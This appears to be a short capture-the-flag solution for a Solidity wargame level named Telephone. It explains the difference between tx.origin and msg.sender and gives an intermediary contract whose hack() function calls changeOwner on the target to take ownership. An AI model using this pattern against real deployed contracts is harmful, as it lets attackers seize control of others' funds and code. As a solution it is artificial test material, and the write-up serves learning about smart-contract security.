`tx.origin` can be different than `msg.sender`. If contract A calls contract B, in B `msg.sender` is A but `tx.origin` is the original caller.

```
pragma solidity ^0.8.0;

contract Telephone {
    function changeOwner(address) public {}
}

contract BridgeTelephone {
    Telephone instance;

    constructor() {
        instance = Telephone(<contract instance>);
    }

    function hack() public {
        instance.changeOwner(<player address>);
    }
}
```
